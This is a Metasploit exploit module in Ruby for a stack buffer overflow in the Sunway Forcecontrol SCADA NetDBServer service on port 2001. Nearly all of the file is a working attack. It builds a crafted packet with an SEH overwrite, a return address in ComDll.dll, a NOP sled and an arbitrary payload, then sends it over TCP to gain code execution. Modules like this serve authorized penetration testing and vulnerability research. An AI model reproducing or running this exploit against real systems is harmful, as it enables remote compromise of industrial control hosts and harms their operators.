##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57',
			'Description'    => %q{
					This module exploits a stack based buffer overflow found in the SNMP
				NetDBServer service of Sunway Forcecontrol <= 6.1 sp3. The overflow is
				triggered when sending an overly long string to the listening service
				on port 2001.
			},
			'Author'         => [
						'Luigi Auriemma', # original discovery
						'Rinat Ziyayev',
						'James Fitts'
					],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'BID', '49747' ],
					[ 'URL', 'http://aluigi.altervista.org/adv/forcecontrol_1-adv.txt' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'DisableNops' => 'true',
					'BadChars' => "\x0a\x0d\xae",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						# p/p/r ComDll.dll
						'Windows', {  'Ret' => 0x100022c4 }
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Sep 22 2011'))

		register_options(
			[
				Opt::RPORT(2001)
			], self.class )
	end

	def exploit
		connect

		header =  "\xeb\x50\xeb\x50"
		header << "\x57\x00"  # packet type
		header << "\xff\xff\x00\x00"
		header << "\x01\x00"
		header << "\xff"

		footer = "\r\n"

		packet = rand_text_alpha_upper(65535)
		packet[0,header.length] = header
		packet[293,8] = generate_seh_record(target.ret)
		packet[301,20] = make_nops(20)
		packet[321,payload.encoded.length] = payload.encoded
		packet[65533,2] = footer

		print_status("Trying target %s..." % target.name)

		sock.put(packet)

		handler
		disconnect
	end

end